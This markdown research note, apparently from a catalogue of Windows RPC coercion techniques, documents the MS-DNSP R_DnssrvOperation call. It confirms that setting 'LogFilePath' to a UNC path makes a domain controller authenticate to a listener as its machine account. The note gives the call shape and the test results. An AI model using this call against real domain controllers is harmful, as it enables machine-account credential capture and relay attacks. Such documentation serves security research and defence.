# MS-DNSP - Remote call to R_DnssrvOperation (opnum 0)

## Summary

+ **Protocol**: [[MS-DNSP]: Domain Name Service (DNS) Server Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a)

+ **Protocol UUID**: 50abc2a4-574d-40b3-9d66-ee4fd5fba076

+ **Interface version**: 5.0

+ **Transport**: `ncacn_ip_tcp` (dynamic port resolved through the endpoint mapper on TCP/135). On the tested Windows Server 2025 DC the `\PIPE\DNSSERVER` named pipe was **not** present; the DNS management interface was reachable only over `ncacn_ip_tcp`.

+ **Function name**: [`R_DnssrvOperation`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/9500a7e8-165d-4b13-be86-0ddc43100eef)

+ **Function operation number**: `0`

+ **Authenticated**: Yes

## Description

`R_DnssrvOperation` is a generic dispatcher: the actual action is selected by the `pszOperation`
string, and the data for it travels in the `pData` union (typed by `dwTypeId`). Several operations
take a filesystem path, which makes this method a coercion surface — if a path operation accepts a
UNC path, the DNS server (running as the machine account) authenticates to it.

Two path-bearing operations were investigated here. **`LogFilePath` is a confirmed coercion
primitive**; `ZoneExport` is not (the server confines its filename). See the testing section below.

### Authorization ([MS-DNSP] 3.1.6.1)

Write privilege is required for all `R_DnssrvOperation` operations except a small read-privilege
list (`ZoneCreate`, `CreateZoneScope`, `DeleteZone`, `DeleteZoneScope`, `EnlistDirectoryPartition`,
`ExportSettings`). Server-level operations (`pszZone == NULL`) test the **DNS Server Configuration
ACL**; zone operations test that zone's ACL. `LogFilePath` is a server-level write operation, so it
requires membership of **DnsAdmins** (or Domain Admins).

## Coercion via `LogFilePath` — CONFIRMED

`LogFilePath` sets the path of the DNS debug log file. Per [MS-DNSP], `dwTypeId` must be
`DNSSRV_TYPEID_LPWSTR` and `pData` a Unicode string containing "an absolute or relative pathname or
filename for the debug log file on the DNS server". A UNC path is accepted, and the DNS server
reaches it **immediately on set** — no service restart and no separate "enable logging" step is
required (this is the key operational advantage over `ServerLevelPluginDll`, which only loads on a
later lookup).

Call shape:

```cpp
R_DnssrvOperation(
    pwszServerName = <target>,
    pszZone        = NULL,                       // server-level operation
    dwContext      = 0,
    pszOperation   = "LogFilePath",
    dwTypeId       = DNSSRV_TYPEID_LPWSTR (3),
    pData          = { WideString: "\\<listener>\share\anything.txt" }
)
```

## Function technical detail

```cpp
LONG R_DnssrvOperation(
   [in]                              handle_t                hBindingHandle,
   [in, unique, string]              LPCWSTR                 pwszServerName,
   [in, unique, string]              LPCSTR                  pszZone,
   [in]                              DWORD                   dwContext,
   [in, unique, string]              LPCSTR                  pszOperation,
   [in]                              DWORD                   dwTypeId,
   [in, switch_is(dwTypeId)]         DNSSRV_RPC_UNION        pData
 );
```

+ **pszOperation**: name of the operation, e.g. `LogFilePath`, `ServerLevelPluginDll`, `ZoneExport`.
+ **dwTypeId**: `DNS_RPC_TYPEID` selecting the `pData` union arm (`DNSSRV_TYPEID_LPWSTR` = 3, `DNSSRV_TYPEID_ZONE_EXPORT` = 18, …).
+ **pData**: `DNSSRV_RPC_UNION` carrying the operation's argument.

## Testing status

Tested against **Windows Server 2025** (domain controller, DNS role), DNS interface
`50abc2a4-574d-40b3-9d66-ee4fd5fba076` v5.0 over `ncacn_ip_tcp` (EPM-resolved), authenticating as a
member of DnsAdmins, with an SMB listener on the UNC path.

**`LogFilePath` — CONFIRMED coercion.** Setting `pszOperation="LogFilePath"`,
`dwTypeId=DNSSRV_TYPEID_LPWSTR`, `pData.WideString = \\<listener>\share\dnslog.txt` returned
`ERROR_SUCCESS` and the DNS server connected to the listener **immediately**, authenticating as the
domain controller machine account (`<DC>$` captured). No restart was needed. The value was reverted
afterwards by setting `LogFilePath` back to an empty string (verified via `R_DnssrvQuery`).

**`ZoneExport` — NOT a coercion vector on this build.** Invoked as `pszOperation="ZoneExport"`,
`dwTypeId=DNSSRV_TYPEID_ZONE_EXPORT (18)`, with `DNS_RPC_ZONE_EXPORT_INFO.pszZoneExportFile` (a
`char*`), against an existing zone. The server strictly confines the export filename to a **bare
name in the DNS directory**:

| `pszZoneExportFile` | Result |
|---|---|
| `zdump.txt` | `ERROR_SUCCESS` (written to `%systemroot%\System32\dns`) |
| `sub\zdump.txt` (any backslash) | `0x0000000D` ERROR_INVALID_DATA |
| `..\zdump.txt`, `..\..\..\..\zdump.txt` | `0x0000007B` ERROR_INVALID_NAME |
| `C:\Windows\Temp\zdump.txt` (absolute) | `0x0000000D` ERROR_INVALID_DATA |
| `\\<listener>\share\zdump.txt` (UNC) | `0x0000000D` ERROR_INVALID_DATA |

Any path separator is rejected, so no traversal, absolute path, or UNC can be expressed. The
`char*` encoding is irrelevant — the separator check fails first. (The benign `zdump.txt` created by
the baseline was deleted afterwards.)

## Notes on the operation variants

The same operations are exposed by `R_DnssrvOperation2` (opnum 5), `R_DnssrvOperation3` (opnum 12),
and `R_DnssrvOperation4` (opnum 15), which add version/settings-flag parameters. `LogFilePath` is
expected to coerce through those as well; only opnum 0 was exercised in testing.

## References

+ Documentation of protocol [MS-DNSP]: Domain Name Service (DNS) Server Management Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a

+ Documentation of function `R_DnssrvOperation` (opnum 0): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/9500a7e8-165d-4b13-be86-0ddc43100eef

+ `DNS_RPC_ZONE_EXPORT_INFO`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/563518e3-8546-4d3c-88c8-f9b001beaa6e
